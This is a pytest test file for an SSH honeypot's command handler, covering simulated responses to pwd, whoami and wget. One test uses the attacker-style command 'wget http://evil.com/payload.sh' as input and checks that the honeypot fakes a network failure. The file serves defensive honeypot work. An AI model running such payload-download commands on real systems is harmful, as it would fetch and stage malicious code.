import sys
import os
import pytest
from unittest.mock import MagicMock

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from ssh_honeypot.command_handler import CommandHandler

class TestRealisticHandlers:
    
    @pytest.fixture
    def handler(self):
        self.mock_llm = MagicMock()
        self.mock_db = MagicMock()
        self.mock_db.get_cached_response.return_value = None
        return CommandHandler(self.mock_llm, self.mock_db)

    def test_handle_pwd(self, handler):
        context = {'cwd': '/var/log', 'user': 'root'}
        resp, updates = handler.handle_pwd("pwd", context)
        assert resp == "/var/log\n"
        assert updates == {}

    def test_handle_whoami(self, handler):
        context = {'cwd': '/', 'user': 'hackerman'}
        resp, updates = handler.handle_whoami("whoami", context)
        assert resp == "hackerman\n"

    def test_handle_wget_success(self, handler):
        context = {'cwd': '/tmp'}
        cmd = "wget http://evil.com/payload.sh"
        resp, updates = handler.handle_wget(cmd, context)
        
        # New behavior: Network Failure Simulation
        assert "unable to resolve host" in resp or "failed:" in resp or "Network is unreachable" in resp
        # Updates should be empty on failure
        assert not updates.get('file_modifications')

    def test_handle_wget_no_url(self, handler):
        context = {'cwd': '/tmp'}
        cmd = "wget"
        resp, updates = handler.handle_wget(cmd, context)
        assert "missing URL" in resp
